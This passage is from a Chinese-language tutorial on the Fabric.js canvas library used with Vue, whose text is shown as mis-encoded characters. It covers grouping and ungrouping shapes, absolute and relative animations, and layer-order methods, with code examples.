<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-comment">// åœ†å½¢</span>
  <span class="hljs-keyword">const</span> circle = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Circle</span>({
    <span class="hljs-attr">radius</span>: <span class="hljs-number">30</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'#f55'</span>,
    <span class="hljs-attr">top</span>: <span class="hljs-number">70</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">70</span>
  })

  canvas.<span class="hljs-title function_">add</span>(circle)
  canvas.<span class="hljs-property">selection</span> = <span class="hljs-literal">false</span> <span class="hljs-comment">// ä¸å…è®¸ç›´æ¥ä»ç”»å¸ƒæ¡†é€‰</span>
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h2 data-id="heading-37">åˆ†ç»„</h2>
<h3 data-id="heading-38">å»ºç»„</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d77fa6e4a6b44a12bb8404d826041e04~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=LKoJk0QVcEIUtW9o1zW6pzJ3YyQ%3D" alt="039.gif" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-comment">// æ¤­åœ†</span>
  <span class="hljs-keyword">const</span> ellipse = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Ellipse</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">rx</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">ry</span>: <span class="hljs-number">50</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'#ddd'</span>,
    <span class="hljs-attr">originX</span>: <span class="hljs-string">'center'</span>, <span class="hljs-comment">// æ—‹è½¬xè½´ï¼šleft, right, center</span>
    <span class="hljs-attr">originY</span>: <span class="hljs-string">'center'</span> <span class="hljs-comment">// æ—‹è½¬yè½´ï¼štop, bottom, center</span>
  })

  <span class="hljs-comment">// æ–‡æœ¬</span>
  <span class="hljs-keyword">const</span> text = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Text</span>(<span class="hljs-string">'Hello World'</span>, {
    <span class="hljs-attr">top</span>: <span class="hljs-number">40</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">fontSize</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">originX</span>: <span class="hljs-string">"center"</span>,
    <span class="hljs-attr">originY</span>: <span class="hljs-string">"center"</span>
  })

  <span class="hljs-comment">// å»ºç»„</span>
  <span class="hljs-keyword">const</span> group = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Group</span>([ellipse, text], {
    <span class="hljs-attr">top</span>: <span class="hljs-number">50</span>, <span class="hljs-comment">// æ•´ç»„è·ç¦»é¡¶éƒ¨100</span>
    <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>, <span class="hljs-comment">// æ•´ç»„è·ç¦»å·¦ä¾§100</span>
    <span class="hljs-attr">angle</span>: -<span class="hljs-number">10</span>, <span class="hljs-comment">// æ•´ç»„æ—‹è½¬-10deg</span>
  })

  canvas.<span class="hljs-title function_">add</span>(group)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><code>new fabric.Group </code>å¯ä»¥åˆ›å»ºä¸€ä¸ªç»„ï¼ŒæŠŠå¤šä¸ªå›¾å±‚æ”¾åœ¨åŒä¸€ä¸ªç»„å†…ï¼Œå®ç°åŒæ­¥çš„æ“ä½œï¼Œæ¯”å¦‚æ‹–æ‹½ã€ç¼©æ”¾ç­‰ã€‚</p>
<h3 data-id="heading-39">æ“ä½œç»„</h3>
<p><code>Fabric.js</code> çš„ç»„æä¾›äº†å¾ˆå¤šæ–¹æ³•ï¼Œè¿™é‡Œåˆ—ä¸€äº›å¸¸ç”¨çš„ï¼š</p>
<ul>
<li>
<p><code>getObjects()</code> è¿”å›ä¸€ç»„ä¸­æ‰€æœ‰å¯¹è±¡çš„æ•°ç»„</p>
</li>
<li>
<p><code>size()</code> æ‰€æœ‰å¯¹è±¡çš„æ•°é‡</p>
</li>
<li>
<p><code>contains()</code> æ£€æŸ¥ç‰¹å®šå¯¹è±¡æ˜¯å¦åœ¨ <code>group</code> ä¸­</p>
</li>
<li>
<p><code>item()</code> ç»„ä¸­å…ƒç´ </p>
</li>
<li>
<p><code>forEachObject()</code> éå†ç»„ä¸­å¯¹è±¡</p>
</li>
<li>
<p><code>add()</code> æ·»åŠ å…ƒç´ å¯¹è±¡</p>
</li>
<li>
<p><code>remove()</code> åˆ é™¤å…ƒç´ å¯¹è±¡</p>
</li>
<li>
<p><code>fabric.util.object.clone()</code> å…‹éš†</p>
</li>
</ul>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-comment">// æ¤­åœ†</span>
  <span class="hljs-keyword">const</span> ellipse = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Ellipse</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">rx</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">ry</span>: <span class="hljs-number">50</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'#ddd'</span>,
    <span class="hljs-attr">originX</span>: <span class="hljs-string">'center'</span>, <span class="hljs-comment">// æ—‹è½¬xè½´ï¼šleft, right, center</span>
    <span class="hljs-attr">originY</span>: <span class="hljs-string">'center'</span> <span class="hljs-comment">// æ—‹è½¬yè½´ï¼štop, bottom, center</span>
  })

  <span class="hljs-comment">// æ–‡æœ¬</span>
  <span class="hljs-keyword">const</span> text = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Text</span>(<span class="hljs-string">'Hello World'</span>, {
    <span class="hljs-attr">top</span>: <span class="hljs-number">40</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">fontSize</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">originX</span>: <span class="hljs-string">"center"</span>,
    <span class="hljs-attr">originY</span>: <span class="hljs-string">"center"</span>
  })

  <span class="hljs-comment">// å»ºç»„</span>
  <span class="hljs-keyword">const</span> group = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Group</span>([ellipse, text], {
    <span class="hljs-attr">top</span>: <span class="hljs-number">50</span>, <span class="hljs-comment">// æ•´ç»„è·ç¦»é¡¶éƒ¨100</span>
    <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>, <span class="hljs-comment">// æ•´ç»„è·ç¦»å·¦ä¾§100</span>
    <span class="hljs-attr">angle</span>: -<span class="hljs-number">10</span>, <span class="hljs-comment">// æ•´ç»„æ—‹è½¬-10deg</span>
  })

  <span class="hljs-comment">// æ§åˆ¶ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆæ¤­åœ†ï¼‰</span>
  group.<span class="hljs-title function_">item</span>(<span class="hljs-number">0</span>).<span class="hljs-title function_">set</span>(<span class="hljs-string">'fill'</span>, <span class="hljs-string">'#ea5455'</span>)

  <span class="hljs-comment">// æ§åˆ¶ç¬¬äºŒä¸ªå…ƒç´ ï¼ˆæ–‡æœ¬ï¼‰</span>
  group.<span class="hljs-title function_">item</span>(<span class="hljs-number">1</span>).<span class="hljs-title function_">set</span>({
    <span class="hljs-attr">text</span>: <span class="hljs-string">'é›·çŒ´ï¼Œä¸–ç•Œ'</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'#fff'</span>
  })

  canvas.<span class="hljs-title function_">add</span>(group)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-40">å–æ¶ˆåˆ†ç»„</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cd27bc79dd314b30829cce862e3e7ecc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=EhWlcU%2BhPzllN8HcdjAW9MrSN84%3D" alt="041.gif" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"ungroup"</span>&gt;</span>å–æ¶ˆç»„<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">let</span> canvas = <span class="hljs-literal">null</span>

<span class="hljs-comment">// åˆå§‹åŒ–</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-comment">// æ¤­åœ†</span>
  <span class="hljs-keyword">const</span> ellipse = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Ellipse</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">rx</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">ry</span>: <span class="hljs-number">50</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'#ddd'</span>,
    <span class="hljs-attr">originX</span>: <span class="hljs-string">'center'</span>, <span class="hljs-comment">// æ—‹è½¬xè½´ï¼šleft, right, center</span>
    <span class="hljs-attr">originY</span>: <span class="hljs-string">'center'</span> <span class="hljs-comment">// æ—‹è½¬yè½´ï¼štop, bottom, center</span>
  })

  <span class="hljs-comment">// æ–‡æœ¬</span>
  <span class="hljs-keyword">const</span> text = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Text</span>(<span class="hljs-string">'Hello World'</span>, {
    <span class="hljs-attr">top</span>: <span class="hljs-number">40</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">fontSize</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">originX</span>: <span class="hljs-string">"center"</span>,
    <span class="hljs-attr">originY</span>: <span class="hljs-string">"center"</span>
  })

  <span class="hljs-comment">// å»ºç»„</span>
  <span class="hljs-keyword">const</span> group = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Group</span>([ellipse, text], {
    <span class="hljs-attr">top</span>: <span class="hljs-number">50</span>, <span class="hljs-comment">// æ•´ç»„è·ç¦»é¡¶éƒ¨100</span>
    <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>, <span class="hljs-comment">// æ•´ç»„è·ç¦»å·¦ä¾§100</span>
    <span class="hljs-attr">angle</span>: -<span class="hljs-number">10</span>, <span class="hljs-comment">// æ•´ç»„æ—‹è½¬-10deg</span>
  })

  canvas.<span class="hljs-title function_">add</span>(group)
}

<span class="hljs-comment">// å–æ¶ˆç»„</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">ungroup</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// åˆ¤æ–­å½“å‰æœ‰æ²¡æœ‰é€‰ä¸­å…ƒç´ ï¼Œå¦‚æœæ²¡æœ‰å°±ä¸æ‰§è¡Œä»»ä½•æ“ä½œ</span>
  <span class="hljs-keyword">if</span> (!canvas.<span class="hljs-title function_">getActiveObject</span>()) {
    <span class="hljs-keyword">return</span>
  }

  <span class="hljs-comment">// åˆ¤æ–­å½“å‰æ˜¯å¦é€‰ä¸­ç»„ï¼Œå¦‚æœä¸æ˜¯ï¼Œå°±ä¸æ‰§è¡Œä»»ä½•æ“ä½œ</span>
  <span class="hljs-keyword">if</span> (canvas.<span class="hljs-title function_">getActiveObject</span>().<span class="hljs-property">type</span> !== <span class="hljs-string">'group'</span>) {
    <span class="hljs-keyword">return</span>
  }

  <span class="hljs-comment">// å…ˆè·å–å½“å‰é€‰ä¸­çš„å¯¹è±¡ï¼Œç„¶åæ‰“æ•£</span>
  canvas.<span class="hljs-title function_">getActiveObject</span>().<span class="hljs-title function_">toActiveSelection</span>()
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h2 data-id="heading-41">åŠ¨ç”»</h2>
<h3 data-id="heading-42">ç»å¯¹å€¼åŠ¨ç”»</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/69131934df9f43c6b39d031a512a88dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=xcmFtx63DjTwqgLDho0BIqRrSuw%3D" alt="042.gif" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-comment">// åˆå§‹åŒ–</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-keyword">const</span> rect = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Rect</span>({
    <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">top</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">width</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">height</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'red'</span>
  })

  <span class="hljs-comment">// è®¾ç½®çŸ©å½¢åŠ¨ç”»</span>
  rect.<span class="hljs-title function_">animate</span>(<span class="hljs-string">'angle'</span>, <span class="hljs-string">"-50"</span>, {
    <span class="hljs-attr">onChange</span>:canvas.<span class="hljs-property">renderAll</span>.<span class="hljs-title function_">bind</span>(canvas), <span class="hljs-comment">// æ¯æ¬¡åˆ·æ–°çš„æ—¶å€™éƒ½ä¼šæ‰§è¡Œ</span>
  })

  canvas.<span class="hljs-title function_">add</span>(rect)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>æ¯ä¸ª <code>Fabric</code> å¯¹è±¡éƒ½æœ‰ä¸€ä¸ª <code>animate</code> æ–¹æ³•ï¼Œè¯¥æ–¹æ³•å¯ä»¥åŠ¨ç”»åŒ–è¯¥å¯¹è±¡ã€‚</p>
<p>ç”¨æ³•ï¼š<code>animate(åŠ¨ç”»å±æ€§, åŠ¨ç”»çš„ç»“æŸå€¼, [ç”»çš„è¯¦ç»†ä¿¡æ¯])</code></p>
<p><strong>ç¬¬ä¸€ä¸ªå‚æ•°</strong>æ˜¯è¦è®¾ç½®åŠ¨ç”»çš„å±æ€§ã€‚</p>
<p><strong>ç¬¬äºŒä¸ªå‚æ•°</strong>æ˜¯åŠ¨ç”»çš„ç»“æŸå€¼ã€‚</p>
<p><strong>ç¬¬ä¸‰ä¸ªå‚æ•°</strong>æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼ŒåŒ…æ‹¬:</p>
<pre><code class="hljs language-ts" lang="ts">{

   romï¼šå…è®¸æŒ‡å®šå¯è®¾ç½®åŠ¨ç”»çš„å±æ€§çš„èµ·å§‹å€¼ï¼ˆå¦‚æœæˆ‘ä»¬ä¸å¸Œæœ›ä½¿ç”¨å½“å‰å€¼ï¼‰ã€‚

   durationï¼šé»˜è®¤ä¸º<span class="hljs-number">500</span>ï¼ˆmsï¼‰ã€‚å¯ç”¨äºæ›´æ”¹åŠ¨ç”»çš„æŒç»­æ—¶é—´ã€‚

   onCompleteï¼šåœ¨åŠ¨ç”»ç»“æŸæ—¶è°ƒç”¨çš„å›è°ƒã€‚

   easingï¼šç¼“åŠ¨åŠŸèƒ½ã€‚

}
</code></pre>
<h3 data-id="heading-43">ç›¸å¯¹å€¼åŠ¨ç”»</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d917634fef71418fa7d6c757b1f58583~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=ZKtKlNRQRMCAC3GiJ5SbPXl0MAM%3D" alt="043.gif" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-comment">// åˆå§‹åŒ–</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)
  <span class="hljs-keyword">const</span> rect = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Rect</span>({
    <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">top</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">width</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">height</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'red'</span>
  })

  <span class="hljs-comment">// è¯·æ³¨æ„ç¬¬äºŒä¸ªå‚æ•°ï¼š+=360</span>
  rect.<span class="hljs-title function_">animate</span>(<span class="hljs-string">'angle'</span>, <span class="hljs-string">'+=360'</span>, {
    <span class="hljs-attr">onChange</span>:canvas.<span class="hljs-property">renderAll</span>.<span class="hljs-title function_">bind</span>(canvas), <span class="hljs-comment">// æ¯æ¬¡åˆ·æ–°çš„æ—¶å€™éƒ½ä¼šæ‰§è¡Œ</span>
    <span class="hljs-attr">duration</span>: <span class="hljs-number">2000</span>, <span class="hljs-comment">// æ‰§è¡Œæ—¶é—´</span>
    <span class="hljs-attr">easing</span>: fabric.<span class="hljs-property">util</span>.<span class="hljs-property">ease</span>.<span class="hljs-property">easeOutBounce</span>, <span class="hljs-comment">// ç¼“å†²æ•ˆæœ</span>
  })

  canvas.<span class="hljs-title function_">add</span>(rect)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><code>ç»å¯¹å€¼åŠ¨ç”»</code> å’Œ <code>ç›¸å¯¹å€¼åŠ¨ç”»</code> çš„ç”¨æ³•æ˜¯å·®ä¸å¤šçš„ï¼Œåªæ˜¯ <strong>ç¬¬äºŒä¸ªå‚æ•°</strong> ç”¨æ³•ä¸åŒã€‚</p>
<p><code>ç›¸å¯¹å€¼åŠ¨ç”»</code> æ˜¯æŠŠ <code>animate</code> æ”¹æˆå¸¦ä¸Š<strong>è¿ç®—ç¬¦</strong>çš„å€¼ï¼Œè¿™æ ·å°±ä¼šåœ¨åŸåŸºç¡€ä¸Šåšè®¡ç®—ã€‚</p>
<h2 data-id="heading-44">è®¾ç½®å›¾å½¢å±‚çº§</h2>
<ul>
<li>
<p><strong>Canvaså¯¹è±¡å±‚çº§æ“ä½œæ–¹æ³•</strong>ï¼š</p>
<ul>
<li><code>canvas.bringToFront(object)</code>: å°†æŒ‡å®šå¯¹è±¡ç§»åˆ°æœ€å‰é¢ã€‚</li>
<li><code>canvas.sendToBack(object)</code>: å°†æŒ‡å®šå¯¹è±¡ç§»åˆ°æœ€åé¢ã€‚</li>
<li><code>canvas.bringForward(object)</code>: å°†æŒ‡å®šå¯¹è±¡å‘å‰ç§»åŠ¨ä¸€ä¸ªå±‚çº§ã€‚</li>
<li><code>canvas.sendBackwards(object)</code>: å°†æŒ‡å®šå¯¹è±¡å‘åç§»åŠ¨ä¸€ä¸ªå±‚çº§ã€‚</li>
<li><code>canvas.moveTo(object, index)</code>: å°†æŒ‡å®šå¯¹è±¡ç§»åŠ¨åˆ°æŒ‡å®šçš„å±‚çº§ç´¢å¼•ã€‚</li>
</ul>
</li>
<li>
<p><strong>Objectå¯¹è±¡å±‚çº§æ“ä½œæ–¹æ³•</strong>ï¼š</p>
<ul>
<li><code>object.bringToFront()</code>: å°†å½“å‰å¯¹è±¡ç§»åˆ°æœ€å‰é¢ã€‚</li>
<li><code>object.sendToBack()</code>: å°†å½“å‰å¯¹è±¡ç§»åˆ°æœ€åé¢ã€‚</li>
<li><code>object.bringForward(intersecting)</code>: å°†å½“å‰å¯¹è±¡å‘å‰ç§»åŠ¨ä¸€ä¸ªå±‚çº§ï¼Œè‹¥<code>intersecting</code>ä¸ºtrueåˆ™ä¼šè·³è¿‡æ‰€æœ‰äº¤å‰çš„å¯¹è±¡ã€‚</li>
<li><code>object.sendBackwards(intersecting)</code>: å°†å½“å‰å¯¹è±¡å‘åç§»åŠ¨ä¸€ä¸ªå±‚çº§ï¼Œè‹¥<code>intersecting</code>ä¸ºtrueåˆ™ä¼šè·³è¿‡æ‰€æœ‰äº¤å‰çš„å¯¹è±¡ã€‚</li>
<li><code>object.moveTo(index)</code>: å°†å½“å‰å¯¹è±¡ç§»åŠ¨åˆ°æŒ‡å®šçš„å±‚çº§ç´¢å¼•ã€‚</li>
</ul>
</li>
</ul>
<p>æƒ³è¦è·å–å…·ä½“å›¾å½¢çš„å±‚çº§ä¸€èˆ¬ä½¿ç”¨ <strong>canvas.getObjects().indexOf(xxx)</strong> ã€‚</p>
<p>æ˜¾ç„¶ï¼Œè¿™ä¸ªæœ‰ç‚¹éº»çƒ¦ï¼Œæˆ‘ä»¬è‡ªå·±åŠ ä¸€ä¸ª level æ–¹æ³•è®©å…¶ç›´æ¥æ˜¾ç¤ºå¯¹è±¡çš„å±‚çº§ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// æ–°å¢ level æ–¹æ³•</span>
fabric.<span class="hljs-property">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">getLevel</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span>.<span class="hljs-title function_">getObjects</span>().<span class="hljs-title function_">indexOf</span>(<span class="hljs-variable language_">this</span>);
}
<span class="hljs-comment">// æ·»åŠ åˆ°ç”»å¸ƒ</span>
canvas.<span class="hljs-title function_">add</span>(rect, circle, triangle);
<span class="hljs-comment">// è°ƒç”¨levelæ–¹æ³•</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(rect.<span class="hljs-title function_">getLevel</span>()); <span class="hljs-comment">// 0</span>
